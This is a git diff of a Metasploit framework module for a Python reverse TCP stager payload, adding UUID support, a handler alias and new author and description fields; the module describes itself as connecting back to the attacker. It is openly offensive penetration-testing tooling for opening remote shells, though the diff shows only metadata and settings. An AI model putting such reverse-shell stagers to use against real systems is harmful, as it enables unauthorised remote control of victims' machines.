@@ -17,17 +17,26 @@ module Metasploit4
   include Msf::Payload::Python
   include Msf::Payload::Python::ReverseTcp
 
+  def self.handler_type_alias
+    'reverse_tcp_uuid'
+  end
+
   def initialize(info = {})
     super(merge_info(info,
-      'Name'        => 'Python Reverse TCP Stager',
-      'Description' => 'Connect back to the attacker',
-      'Author'      => 'Spencer McIntyre',
+      'Name'        => 'Python Reverse TCP Stager with UUID support',
+      'Description' => 'Connect back to the attacker with UUID support',
+      'Author'      => 'OJ Reeves',
       'License'     => MSF_LICENSE,
       'Platform'    => 'python',
       'Arch'        => ARCH_PYTHON,
       'Handler'     => Msf::Handler::ReverseTcp,
       'Stager'      => {'Payload' => ""}
     ))
+  end
+
+  # Tell the reverse_tcp payload to include the UUID
+  def include_send_uuid
+    true
   end
 
 end
